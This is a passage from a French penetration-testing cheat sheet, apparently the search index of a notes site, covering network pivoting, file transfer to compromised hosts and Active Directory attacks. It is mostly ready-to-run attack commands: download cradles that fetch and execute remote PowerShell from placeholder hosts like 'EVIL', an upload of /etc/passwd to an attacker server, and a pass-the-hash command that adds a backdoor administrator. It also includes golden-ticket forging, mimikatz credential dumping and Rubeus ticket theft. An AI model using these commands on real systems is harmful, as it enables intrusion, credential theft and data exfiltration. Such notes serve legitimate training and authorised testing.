<code>1234</code> qui redirigera le traffic vers le port <code>22</code> (ssh) distant via le tunnel ICMP.</p> <pre><code># ex\u00e9cution serveur sur la machine de l'attaquant (\u00e9coute sur le port 1234 de l'attaquant et redirige le traffic sur le port 22 de la cible ex\u00e9cutant le serveur)\n\nsudo ptunnel-ng -p$PIVOT_IP -l1234 -R22\n#ou \nsudo ptunnel-ng --proxy$PIVOT_IP -l1234 --remote-port22\n</code></pre>"},{"location":"_Techniques/Pivoting/via%20ptunnel-ng/#connexion-au-service-ssh-et-activation-dun-proxy-socks","title":"Connexion au service SSH et activation d'un proxy socks","text":"<p>Il ne reste ensuite plus qu'\u00e0 se connecter au service SSH et cr\u00e9er un tunnel socks :</p> <pre><code>ssh ubuntu@$PIVOT_IP -D 1080\n</code></pre>"},{"location":"_Techniques/Pivoting/via%20socat/","title":"Via socat","text":"<pre><code># ecoute sur le port 1234 et redirige le trafic entrant vers &lt;ATTACKER IP&gt; port 2222\nsocat TCP4-LISTEN:1234,fork TCP4:&lt;ATTACKER IP&gt;:2222\n</code></pre>"},{"location":"_Techniques/Pivoting/via%20ssh/","title":"Via ssh","text":""},{"location":"_Techniques/Pivoting/via%20ssh/#client-ssh","title":"Client SSH","text":"<pre><code># Redirection simple : expose le service mysql de la Cible sur le port 1234 de l'attaquant\nssh -L 1234:localhost:3306 user@$TARGET_IP\n\n# Redirection SOCKS 5 : on pourra utiliser proxychain sur le port 1080 locale de l'attaquant pour transmettre tout notre traffic comme s'il \u00e9tait \u00e9mis de la cible\nssh -D 1080 user@$TARGET_IP\n\n# Redirection inverse : on expose notre listener local \u00e9coutant sur le port 1234 sur le port 8080 de la Cible  Peut n\u00e9cessiter d'avoir    GatewayPorts yes    dans le fichier /etc/sshd_config\nssh -R $PIVOT_IP_IN_INTERNAL_NETWORK:8080:0.0.0.0:1234  user@$TARGET_IP -vN\n\n# -v : verbeux, on verra les tunnels\n# -N : on ne lance pas de shell\n</code></pre>"},{"location":"_Techniques/Pivoting/via%20ssh/#client-sshuttle","title":"Client Sshuttle","text":"<pre><code># disponible via les d\u00e9pots apt\n# on se connecte \u00e0 un serveur SSH via l'outil\n# l'outil cr\u00e9e des r\u00e8gles dans iptables pour rediriger le traffic r\u00e9seau\nsudo sshuttle -r ubuntu@10.129.202.64 192.168.1.0/24 -v \n</code></pre> <pre><code># test de fonctionnement \n# pas besoin de proxychains !!\nnmap -sV-p80 -Pn 192.168.1.123\n</code></pre> <p>Remarque : pour une raison inconnue, nmap fonctionne seulement lorsqu'il n'est pas lanc\u00e9 en tant qu'utilisateur root. Cela risque d'\u00eatre de m\u00eame pour d'autres outils...</p>"},{"location":"_Techniques/Transferts%20de%20fichiers/Autre%20outils/RDP/","title":"RDP","text":"<p>On peut en g\u00e9n\u00e9ral utiliser le copier / coller \u00e0 travers une session RDP.</p> <p>Lorsque cela ne fonctionne pas, on peut mapper un dossier sous forme de partage accessible depuis l'hote virtuel <code>\\\\tsclient</code></p> <pre><code># rdesktop\nrdesktop 10.10.10.132 -d DOMAIN -u administrator -p 'Pass' -r disk:shareName='/tmp'\n\n# xfreerdp\nxfreerdp /v:10.10.10.132 /d:DOMAIN /u:administrator /p:'Pass' /kbd:0x40c /drive:share,/tools\n</code></pre>"},{"location":"_Techniques/Transferts%20de%20fichiers/Autre%20outils/nc%20et%20ncat/","title":"Nc et ncat","text":"<p>| Attackbox   ENVOIE file.exe vers | Compromised host |</p> <p>| --- |  --- |</p> <p>| ETABLIT LA CONNEXION |  |</p> <p>| <code>nc -q 0 $TARGET_IP 443 &lt; file.exe</code> | <code>nc -l -p 443 &gt; file.exe</code>|</p> <p>| <code>ncat --send-only $TARGET_IP 443 &lt; file.exe</code> | <code>ncat -l -p 443 --recv-only &gt; file.exe</code>|</p> <p>| Attackbox   ENVOIE file.exe vers | Compromised host |</p> <p>| --- |  --- |</p> <p>|  | ETABLIT LA CONNEXION |</p> <p>| <code>nc -l -p 443 &lt; file.exe</code> | <code>nc -q 0 $TARGET_IP 443</code>|</p> <p>| <code>ncat -l -p 443 --send-only &lt; file.exe</code> | <code>ncat --recv-only $TARGET_IP 443 &gt; file.exe</code>|</p> <pre><code># se connecte \u00e0 $ATTACK_IP et download file.exe\ncat &lt; /dev/tcp/$ATTACK_IP/443 &gt; file.exe\n</code></pre>"},{"location":"_Techniques/Transferts%20de%20fichiers/Autre%20outils/winrm/","title":"Winrm","text":"<p>Si on dispose d'une session PSRemote on peut utiliser le cmdlet <code>Copy-Item</code> :</p> <pre><code>$Session = New-PSSession -ComputerName $SomeHost\n\n# envoie le fichier locale c:\\file.txt vers $SomeHost\nCopy-Item -Path C:\\file.txt -ToSession $Session -Destination C:\\Users\\Administrator\\Desktop\\\n\n# t\u00e9l\u00e9charge le fichier distant C:\\Users\\Administrator\\Desktop\\file.txt depuis $SomeHost\nCopy-Item -Path \"C:\\Users\\Administrator\\Desktop\\DATABASE.txt\" -Destination C:\\ -FromSession $Session\n</code></pre>"},{"location":"_Techniques/Transferts%20de%20fichiers/Linux/Listener%20HTTPS/","title":"Listener HTTPS","text":"<pre><code># installation\npython3 -m pip install --user uploadserver\n\n# creation du certificat\nopenssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'\n\n# lancement du service\npython3 -m uploadserver 443 --server-certificate /root/server.pem\n</code></pre>"},{"location":"_Techniques/Transferts%20de%20fichiers/Linux/Listeners%20HTTP/","title":"Listeners HTTP","text":""},{"location":"_Techniques/Transferts%20de%20fichiers/Linux/Listeners%20HTTP/#python3","title":"Python3","text":"<pre><code>python3 -m http.server\n</code></pre>"},{"location":"_Techniques/Transferts%20de%20fichiers/Linux/Listeners%20HTTP/#python-27","title":"Python 2.7","text":"<pre><code>python2.7 -m SimpleHTTPServer\n</code></pre>"},{"location":"_Techniques/Transferts%20de%20fichiers/Linux/Listeners%20HTTP/#php","title":"PHP","text":"<pre><code>php -S 0.0.0.0:8000\n</code></pre>"},{"location":"_Techniques/Transferts%20de%20fichiers/Linux/Listeners%20HTTP/#ruby","title":"Ruby","text":"<pre><code>ruby -run -ehttpd . -p8000\n</code></pre>"},{"location":"_Techniques/Transferts%20de%20fichiers/Linux/Transfert%20de%20fichiers%20%28download%29/","title":"Transfert de fichiers (download)","text":""},{"location":"_Techniques/Transferts%20de%20fichiers/Linux/Transfert%20de%20fichiers%20%28download%29/#bash-devtcp","title":"Bash (/dev/tcp)","text":"<pre><code># connection\nexec 3&lt;&gt;/dev/tcp/1.2.3.4/80\n\n# Envoie du HTTP GET\necho -e \"GET /LinEnum.sh HTTP/1.1\\n\\n\" &gt;&amp;3\n\n# Affichage de la r\u00e9ponse\ncat &lt;&amp;3\n</code></pre>"},{"location":"_Techniques/Transferts%20de%20fichiers/Via%20du%20code/T%C3%A9l%C3%A9charger%20avec%20du%20code/","title":"T\u00e9l\u00e9charger avec du code","text":"<pre><code>python2.7 -c 'import urllib;urllib.urlretrieve (\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\", \"LinEnum.sh\")'\n\n\npython3 -c 'import urllib.request;urllib.request.urlretrieve(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\", \"LinEnum.sh\")'\n\n\nphp -r '$file = file_get_contents(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\"); file_put_contents(\"LinEnum.sh\",$file);'\n\nphp -r 'const BUFFER = 1024; $fremote = \nfopen(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\", \"rb\"); $flocal = fopen(\"LinEnum.sh\", \"wb\"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'\n\n\nphp -r '$lines = @file(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\"); foreach ($lines as $line_num =&gt; $line) { echo $line; }' | bash\n\nruby -e 'require \"net/http\"; File.write(\"LinEnum.sh\", Net::HTTP.get(URI.parse(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\")))'\n\nperl -e 'use LWP::Simple; getstore(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\", \"LinEnum.sh\");'\n\n\n# wget.js\nvar WinHttpReq = new ActiveXObject(\"WinHttp.WinHttpRequest.5.1\");\nWinHttpReq.Open(\"GET\", WScript.Arguments(0), /*async=*/false);\nWinHttpReq.Send();\nBinStream = new ActiveXObject(\"ADODB.Stream\");\nBinStream.Type = 1;\nBinStream.Open();\nBinStream.Write(WinHttpReq.ResponseBody);\nBinStream.SaveToFile(WScript.Arguments(1));\n\ncscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1\n\n# wget.vbs\ndim xHttp: Set xHttp = createobject(\"Microsoft.XMLHTTP\")\ndim bStrm: Set bStrm = createobject(\"Adodb.Stream\")\nxHttp.Open \"GET\", WScript.Arguments.Item(0), False\nxHttp.Send\n\nwith bStrm\n    .type = 1\n    .open\n    .write xHttp.responseBody\n    .savetofile WScript.Arguments.Item(1), 2\nend with\n\ncscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1\n</code></pre>"},{"location":"_Techniques/Transferts%20de%20fichiers/Via%20du%20code/Uploader%20avec%20du%20code/","title":"Uploader avec du code","text":"<pre><code># python3 -m uploadserver \npython3 -c 'import requests;requests.post(\"http://192.168.49.128:8000/upload\",files={\"files\":open(\"/etc/passwd\",\"rb\")})'\n</code></pre>"},{"location":"_Techniques/Transferts%20de%20fichiers/Windows/Transfert%20de%20fichiers%20%28download%29/","title":"Transfert de fichiers (download)","text":""},{"location":"_Techniques/Transferts%20de%20fichiers/Windows/Transfert%20de%20fichiers%20%28download%29/#http","title":"HTTP","text":""},{"location":"_Techniques/Transferts%20de%20fichiers/Windows/Transfert%20de%20fichiers%20%28download%29/#lolbas","title":"LOLBAS","text":"<p>```shell title=\"T\u00e9l\u00e9chargement d'un fichier \u00e0 l'aide de certutil\" certutil.exe -urlcache -split -f \"http://10.10.14.149:1234/RunasCS.exe\" RunasCS.exe</p>"},{"location":"_Techniques/Transferts%20de%20fichiers/Windows/Transfert%20de%20fichiers%20%28download%29/#powershell","title":"Powershell","text":"<p>```powershell title=enregistrement du fichier powershell.exe (Invoke-WebRequest 'http://192.168.1.2/exploit.exe' -OutFile 'exploit.exe')</p> <p>powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.1.2/exploit.exe', 'exploit.exe')</p> <pre><code>```powershell title=ex\u00e9cution directe d'un script powershell en m\u00e9moire (fileless)\n# si besoin d'accepter des certificats autosign\u00e9s :\n# [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}\nIEX (New-Object Net.WebClient).DownloadString('http://192.168.1.2/exploit.ps1')\n\niwr 'http://192.168.1.2/exploit.ps1' -UseBasicParsing | IEX\n</code></pre>"},{"location":"_Techniques/Transferts%20de%20fichiers/Windows/Transfert%20de%20fichiers%20%28download%29/#variantes","title":"Variantes","text":"<pre><code>## from https://gist.github.com/HarmJ0y/bb48307ffa663256e239\n# normal download cradle\nIEX (New-Object Net.Webclient).downloadstring(\"http://EVIL/evil.ps1\")\n\n# PowerShell 3.0+\nIEX (iwr 'http://EVIL/evil.ps1')\n\n# hidden IE com object\n$ie=New-Object -comobject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://EVIL/evil.ps1');start-sleep -s 5;$r=$ie.Document.body.innerHTML;$ie.quit();IEX $r\n\n# Msxml2.XMLHTTP COM object\n$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://EVIL/evil.ps1',$false);$h.send();iex $h.responseText\n\n# WinHttp COM object (not proxy aware!)\n$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://EVIL/evil.ps1',$false);$h.send();iex $h.responseText\n\n# using bitstransfer- touches disk!\nImport-Module bitstransfer;Start-BitsTransfer 'http://EVIL/evil.ps1' $env:temp\\t;$r=gc $env:temp\\t;rm $env:temp\\t; iex $r\n\n# DNS TXT approach from PowerBreach (https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerBreach/PowerBreach.ps1)\n#   code to execute needs to be a base64 encoded string stored in a TXT record\nIEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(((nslookup -querytype=txt \"SERVER\" | Select -Pattern '\"*\"') -split '\"'[0]))))\n\n# from @subtee - https://gist.github.com/subTee/47f16d60efc9f7cfefd62fb7a712ec8d\n&lt;#\n&lt;?xml version=\"1.0\"?&gt;\n&lt;command&gt;\n   &lt;a&gt;\n      &lt;execute&gt;Get-Process&lt;/execute&gt;\n   &lt;/a&gt;\n  &lt;/command&gt;\n#&gt;\n$a = New-Object System.Xml.XmlDocument\n$a.Load(\"https://gist.githubusercontent.com/subTee/47f16d60efc9f7cfefd62fb7a712ec8d/raw/1ffde429dc4a05f7bc7ffff32017a3133634bc36/gistfile1.txt\")\n$a.command.a.execute | iex\n</code></pre>"},{"location":"_Techniques/Transferts%20de%20fichiers/Windows/Transfert%20de%20fichiers%20%28download%29/#smb","title":"SMB","text":"<pre><code>attacker&gt; sudo smbserver.py myshare ./ -smb2support\nattacker&gt; sudo smbserver.py myshare ./ -smb2support -user rebrec -password blah\nvictim&gt; net use x: \\\\&lt;ATACKER_IP&gt;\\myshare /user rebrec blah\n# \n$username = 'rebrec'\n$password = 'rebrec'\n$secpassword = ConvertTo-SecureString $password -AsPlainText -Force\n$cred = New-Object System.Management.Automation.PSCredential $username, $secpassword\nNew-PSDrive -Name \"S\" -Root \"\\\\192.168.10.10\\Common\" -PSProvider \"FileSystem\" -Credential $cred\n</code></pre>"},{"location":"_Techniques/Transferts%20de%20fichiers/Windows/Transfert%20de%20fichiers%20%28download%29/#ftp","title":"FTP","text":"<pre><code># installation\npip3 install pyftpdlib\n\n# lancement du serveur dans le dossier courant\nsudo python3 -m pyftpdlib --port 21\n\n# t\u00e9l\u00e9chargement depuis la victime\nPS&gt; (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'ftp-file.txt')\n</code></pre>"},{"location":"_Techniques/Transferts%20de%20fichiers/Windows/Transfert%20de%20fichiers%20%28download%29/#transfert-de-tous-les-fichiers-dun-dossier","title":"Transfert de tous les fichiers d'un dossier","text":"<pre><code># on lance un listener HTTP sur la machine o\u00f9 se trouve le dossier \u00e0 copier\npython -m http.server 8001\n\n# on r\u00e9cup\u00e8re tous les fichiers \nwget -r http://$TARGET_IP:8001\nwget -m --no-passive ftp://anonymous:anonymous@10.129.14.136\n</code></pre>"},{"location":"_Techniques/Transferts%20de%20fichiers/Windows/Transfert%20de%20fichiers%20%28download%29/#base-64","title":"Base 64","text":"<pre><code># si on veut transf\u00e9rer le fichier shell\nbase64 shell -w 0\n# on copie le r\u00e9sultat dans le presse papier\n# puis on le colle dans la machine distante\n$ echo xxxxxxxxxxxxxxxxxxx | base64 -d &gt; shell\n</code></pre>"},{"location":"_Techniques/Transferts%20de%20fichiers/Windows/Transfert%20de%20fichiers%20%28download%29/#windows","title":"Windows","text":"<pre><code>[Convert]::ToBase64String((Get-Content -path \"C:\\Windows\\system32\\drivers\\etc\\hosts\" -Encoding byte))\n</code></pre>"},{"location":"_Techniques/Windows/icacls/","title":"Icacls","text":"<pre><code># Ajout d'une ACE autorisant tout utilisateur \u00e0 un contr\u00f4le total d'un dossier :\nicacls c:\\rebrec /grant \"Everyone:(OI)(CI)F\"\n</code></pre> <p>icacls /grant rebrec:F /T</p>"},{"location":"_Techniques/Windows/AD/Extra%20SID%20-%20Golden%20Tickets/","title":"Extra SID   Golden Tickets","text":"<p>Il s'agit d'une attaque offrant la possibilit\u00e9 de compromettre une for\u00eat AD \u00e0 partir d'un domaine compromis.</p> <p>Il s'appuie sur la cr\u00e9ation d'un golden ticket qui contiendra un SID history \u00e9gal au SID du groupe de s\u00e9curit\u00e9 administrateur de l'entreprise.</p>"},{"location":"_Techniques/Windows/AD/Extra%20SID%20-%20Golden%20Tickets/#prerequis","title":"Pr\u00e9requis","text":"<ul> <li>Disposer du Hash NTLM (LM:NT) du compte krbtgt du domaine enfant (r\u00e9cup\u00e9rable via  <code>lsadump::dcsync /user:krbtgt@LOGISTICS.INLANEFREIGHT.LOCAL</code>)</li> </ul>"},{"location":"_Techniques/Windows/AD/Extra%20SID%20-%20Golden%20Tickets/#attaque","title":"Attaque","text":""},{"location":"_Techniques/Windows/AD/Extra%20SID%20-%20Golden%20Tickets/#sous-windows","title":"Sous Windows","text":""},{"location":"_Techniques/Windows/AD/Extra%20SID%20-%20Golden%20Tickets/#recuperation-des-elements-necessaires","title":"R\u00e9cup\u00e9ration des \u00e9l\u00e9ments  n\u00e9cessaires","text":"<pre><code># r\u00e9cup\u00e9ration du SID du groupe \"administtrateurs de l'entreprise\"\n Get-DomainGroup -Domain &lt;PARENT DOMAIN&gt; | ? {$_.SamAccountName -like \"Enterprise Admins\"}| Select -ExpandProperty objectsid\n\n# r\u00e9cup\u00e9ration du hash du krbtgt du domaine compromis\nmimikatz\n lsadump::dcsync /user:krbtgt@&lt;domain&gt;\n\n# r\u00e9cup\u00e9ration du sid du groupe entreprise admin\nget-domaingroup -Domain inlanefreight.local|?{$_.samaccountname -like \"ent*admin*\"}|select name,objectsid\n\n# r\u00e9cup\u00e9ration du sid du domaine \nget-domainsid\n</code></pre>"},{"location":"_Techniques/Windows/AD/Extra%20SID%20-%20Golden%20Tickets/#mimikatz","title":"Mimikatz","text":"<pre><code># cr\u00e9ation du golden ticket\nmimikatz\n kerberos::golden /user:&lt;fake or real user&gt; /domain:&lt;compromised domain&gt; /sid:&lt;compromised domain s SID&gt; /sids:&lt;Group SID to privesc&gt; /rc4:&lt;compromised domain s KRBTGT hash&gt; /ptt\n</code></pre>"},{"location":"_Techniques/Windows/AD/Extra%20SID%20-%20Golden%20Tickets/#rubeus","title":"Rubeus","text":"<pre><code>.\\Rubeus.exe golden /rc4:&lt;compromised domain s KRBTGT hash&gt; /domain:&lt;compromised domain&gt; /sid:&lt;compromised domain s SID&gt;  /sids:&lt;Group SID to privesc&gt; /user:&lt;fake or real user&gt; /ptt\n</code></pre>"},{"location":"_Techniques/Windows/AD/Extra%20SID%20-%20Golden%20Tickets/#sous-linux","title":"Sous Linux","text":""},{"location":"_Techniques/Windows/AD/Extra%20SID%20-%20Golden%20Tickets/#recuperation-des-elements-necessaires_1","title":"R\u00e9cup\u00e9ration des \u00e9l\u00e9ments  n\u00e9cessaires","text":"<pre><code># r\u00e9cup\u00e9ration du SID du groupe \"administtrateurs de l'entreprise\"\n lookupsid.py\n\n# r\u00e9cup\u00e9ration du hash du krbtgt du domaine compromis\nsecretsdump.py &lt;compromised domain FQDN&gt;/&lt;domain admin user&gt;:&lt;password@&lt;dc ip&gt; -just-dc -just-dc-user &lt;domain netbios&gt;/krbtgt\n\n9d765b482771505cbe97411065964d5f\n# r\u00e9cup\u00e9ration du sid du groupe entreprise admin\nlookupsid.py &lt;compromised domain FQDN&gt;/&lt;domain admin user&gt;:&lt;password@&lt;dc ip wher Enterprise admin is defined&gt; | grep -Ei 'ent.*adm.*'\n\n\nS-1-5-21-3842939050-3880317879-2865463114-519\n# r\u00e9cup\u00e9ration du sid du domaine \nlookupsid.py &lt;compromised domain FQDN&gt;/&lt;domain admin user&gt;:&lt;password@&lt;dc ip wher Enterprise admin is defined&gt; | head\n</code></pre>"},{"location":"_Techniques/Windows/AD/Extra%20SID%20-%20Golden%20Tickets/#ticketerpy","title":"ticketer.py","text":"<pre><code># cr\u00e9ation du golden ticket\nticketer.py -nthash &lt;compromised domain s KRBTGT hash&gt; -domain &lt;compromised domain&gt;  -domain-sid &lt;compromised domain s SID&gt; -extra-sid &lt;Group SID to privesc&gt; &lt;fake or real user&gt;\n\n# utilisation\nexport KRB5CCNAME=$PWD/&lt;fake or real user&gt;.ccache\n\npsexec.py -k -no-pass &lt;fake or real user&gt;@&lt;target FQDN&gt; -dc-ip &lt;dc ip&gt; -target-ip &lt;target-ip&gt;\n</code></pre>"},{"location":"_Techniques/Windows/AD/Extra%20SID%20-%20Golden%20Tickets/#raisechildpy","title":"raiseChild.py","text":"<pre><code>raiseChild.py &lt;compromised domain FQDN&gt;/&lt;domain admin user&gt;:&lt;password&gt; -target-exec &lt;target ip&gt;\n</code></pre>"},{"location":"_Techniques/Windows/AD/Pass%20The%20Hash%20%28PtH%29/","title":"Pass The Hash (PtH)","text":""},{"location":"_Techniques/Windows/AD/Pass%20The%20Hash%20%28PtH%29/#localement","title":"Localement","text":""},{"location":"_Techniques/Windows/AD/Pass%20The%20Hash%20%28PtH%29/#mimikatz","title":"Mimikatz","text":"<p>On peut cr\u00e9er un processus disposant des identifiants r\u00e9seau d'un autre utilisateur pour acc\u00e9der \u00e0 des ressources r\u00e9seau en son nom</p> <pre><code># lancer un processus en tant qu'un autre utilisateur (julio) dont on connait le hash\n    # on peut remplacer /rc4 par /NTLM\nmimikatz.exe privilege::debug \"sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:domain.local /run:cmd.exe\" exit\n</code></pre>"},{"location":"_Techniques/Windows/AD/Pass%20The%20Hash%20%28PtH%29/#invoke-thehash","title":"Invoke-TheHAsh","text":"<p>On peut \u00e9galement ex\u00e9cuter des commandes \u00e0 distance en tant qu'un utilisateur dont on poss\u00e8de le Hash (s'il poss\u00e8de les droits requis bien \u00e9videmment)</p> <pre><code># Powershell avec Invoke-TheHash (https://github.com/Kevin-Robertson/Invoke-TheHash)\nImport-Module .\\Invoke-TheHash.psd1\n\n# ex\u00e9cution de command (backdoor user)\nInvoke-SMBExec -Target 172.16.1.10 -Domain domain.local -Username ad_user -Hash AAAAAAAAAA88057E06A81B54E73B949B -Command \"net user rebrec Password123 /add &amp;&amp; net localgroup administrators rebrec /add\" -Verbose\n\n# lancement d'un reverse shell\nInvoke-WMIExec -Target DC01 -Domain domain.local -Username ad_user -Hash AAAAAAAAAA88057E06A81B54E73B949B -Command \"powershell -e &lt;base64_reverseshell_payload&gt;\"\n</code></pre>"},{"location":"_Techniques/Windows/AD/Pass%20The%20Hash%20%28PtH%29/#a-distance","title":"A Distance","text":""},{"location":"_Techniques/Windows/AD/Pass%20The%20Hash%20%28PtH%29/#crackmapexec","title":"Crackmapexec","text":"<pre><code># Tester les machines d'un sous r\u00e9seau \ncme smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453\ncme smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 --local-auth\n\n# Ex\u00e9cuter une commande sur les machines\ncme smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami\n</code></pre>"},{"location":"_Techniques/Windows/AD/Pass%20The%20Hash%20%28PtH%29/#impacket","title":"Impacket","text":"<pre><code>psexec.py Administrator@$TARGET_IP -hashes :30B3783CE2ABF1AF70F77D0660CF3453  \n</code></pre>"},{"location":"_Techniques/Windows/AD/Pass%20The%20Hash%20%28PtH%29/#evil-winrm","title":"Evil-WinRM","text":"<pre><code>evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453\n</code></pre>"},{"location":"_Techniques/Windows/AD/Pass%20The%20Hash%20%28PtH%29/#via-rdp","title":"Via RDP","text":"<p>Il est n\u00e9cessaire de d\u00e9sactiver une restriction emp\u00eachant de se connecter en RDP en administrateur via du PtH. Pour ce faire :</p> <pre><code># Localement\nreg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f\n\n# A Distance\ncme smb $TARGET_IP -u Administrator -H '30B3783CE2ABF1AF70F77D0660CF3453' --local-auth -x 'reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f' \n</code></pre> <p>On peut ensuite utiliser xfreerdp</p> <pre><code>xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B\n</code></pre> <p>Attention</p> <p>Seul le compte Administrateur local (RID-500) peut utiliser PtH sur les environnements o\u00f9 l'UAC est actif.</p> <p>Le param\u00e8tre <code>HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\LocalAccountTokenFilterPolicy</code>est \u00e0 <code>1</code>, alors tous les compte locaux membre du groupe <code>Administrateur Local</code> pourront le faire \u00e9galement (car ils disposeront d'un jeton \"Full Integrity\")</p> <p>** Les comptes utilisateurs du domaine qui sont membres du groupe <code>Administrateur Local</code> ne sont dans tous les cas, pas bloqu\u00e9s et peuvent utiliser une attaque de type PtH**</p>"},{"location":"_Techniques/Windows/AD/Pass%20The%20Hash%20%28PtH%29/#script-complet-si-execution-a-distance-autorisee","title":"Script complet (si execution \u00e0 distance autoris\u00e9e)","text":"<pre><code>################## Non test\u00e9 pour l'instant\nexport HASH='30B3783CE2ABF1AF70F77D0660CF3453'\nexport USER='Administrator'\n\necho \"Check status of RestrictedAdmin setting\"\ncme smb $TARGET_IP -u $USER -H $HASH --local-auth -x 'reg query HKLM\\System\\CurrentControlSet\\Control\\Lsa /v DisableRestrictedAdmin' \n\necho \"Disabling\"\ncme smb $TARGET_IP -u $USER -H $HASH --local-auth -x 'reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f' \n\necho \"Connecting\"\nxfreerdp  /v:$TARGET_IP /u:$USER /pth:$HASH\n</code></pre>"},{"location":"_Techniques/Windows/AD/Pass%20the%20Ticket%20%28PtT%29/","title":"Pass the Ticket (PtT)","text":""},{"location":"_Techniques/Windows/AD/Pass%20the%20Ticket%20%28PtT%29/#principe","title":"Principe","text":"<p>Voler / extraire un ticket kerberos et le r\u00e9utiliser</p> <ul> <li>s'il s'agit d'un TGT, on pourra demander de nouveaux TGS</li> <li>s'il s'agit d'un TGS, on pourra l'utiliser pour communiquer avec le service cible.</li> </ul> <p>Pour collecter les tickets Kerberos, on utilisera soit mimikatz, soit rubeus localement.</p>"},{"location":"_Techniques/Windows/AD/Pass%20the%20Ticket%20%28PtT%29/#collecter-des-tickets-kerberos","title":"Collecter des tickets Kerberos","text":""},{"location":"_Techniques/Windows/AD/Pass%20the%20Ticket%20%28PtT%29/#mimikatz","title":"Mimikatz","text":"<pre><code># cr\u00e9e un fichier .kirbi par ticket export\u00e9\nmimikatz.exe privilege::debug \"sekurlsa::tickets /export\"\n</code></pre>"},{"location":"_Techniques/Windows/AD/Pass%20the%20Ticket%20%28PtT%29/#rubeus","title":"Rubeus","text":"<pre><code># Affiche dans la console la encod\u00e9e en base 64 des tickets kirbi\nRubeus.exe dump /nowrap\n</code></pre>"},{"location":"_Techniques/Windows/AD/Pass%20the%20Ticket%20%28PtT%29/#utiliser-des-tickets","title":"Utiliser des tickets","text":""},{"location":"_Techniques/Windows/AD/Pass%20the%20Ticket%20%28PtT%29/#mimikatz_1","title":"Mimikatz","text":"<pre><code>mimikatz.exe privilege::debug \"kerberos::ptt ticket.kirbi\"\n</code></pre>"},{"location":"_Techniques/Windows/AD/Pass%20the%20Ticket%20%28PtT%29/#creer-ses-propres-tickets","title":"Cr\u00e9er ses propres tickets","text":"<p>Cette technique s'appelle OverPass the Hash ou Pass The Key</p> <p>Pr\u00e9requis : disposer d'un Hash de mot de passe (RC4_HMAC, AES256_CTS_HMAC_SHA1, etc.)</p>"},{"location":"_Techniques/Windows/AD/Pass%20the%20Ticket%20%28PtT%29/#extraire-les-cle-kerberos","title":"Extraire les cl\u00e9 Kerberos","text":"<pre><code># r\u00e9cup\u00e9ration des cl\u00e9s AES256_HMAC et RC4_HMA\nmimikatz.exe privilege::debug \"sekurlsa::ekeys\"\n</code></pre>"},{"location":"_Techniques/Windows/AD/Pass%20the%20Ticket%20%28PtT%29/#pass-the-key-overpass-the-hash","title":"Pass the Key (OverPass the Hash)","text":"<p>Permet de demander un TGT \u00e0 partir d'un hash</p>"},{"location":"_Techniques/Windows/AD/Pass%20the%20Ticket%20%28PtT%29/#mimikatz_2","title":"Mimikatz","text":"<p>N\u00e9cessite d'\u00eatre administrateur local</p> <pre><code># cr\u00e9e un processus cmd.exe ayant en m\u00e9moire le TGT de MYUSER \nmimikatz.exe privilege::debug \"sekurlsa::pth /domain:domain.local /user:MYUSER /ntlm:&lt;THE_HASH&gt;\"\n</code></pre>"},{"location":"_Techniques/Windows/AD/Pass%20the%20Ticket%20%28PtT%29/#rubeus_1","title":"Rubeus","text":"<p>Ne n\u00e9cessite pas d'\u00eatre administrateur local :)</p> <pre><code># affiche la version encod\u00e9e en b64 du kirbi\nRubeus.exe  asktgt /domain:domain.local /user:MYUSER /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap\n</code></pre>"},{"location":"_Techniques/Windows/AD/Pass%20the%20Ticket%20%28PtT%29/#pass-the-ticket","title":"Pass The Ticket","text":"<p>Utiliser les tickets pour r\u00e9aliser des mouvements lat\u00e9raux.</p>"},{"location":"_Techniques/Windows/AD/Pass%20the%20Ticket%20%28PtT%29/#rubeus_2","title":"Rubeus","text":"<pre><code># Sans ticket pr\u00e9alable : \n# r\u00e9alise \u00e0 la fois le PassTheKey et le Pass The Ticket\nRubeus.exe asktgt /domain:domain.local /user:MYUSER /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt\n\n# Importation depuis un ticket.kirbi\nRubeus.exe ptt /ticket:ticket.kirbi\n\n# PTT depuis un ticket encod\u00e9 en base 64 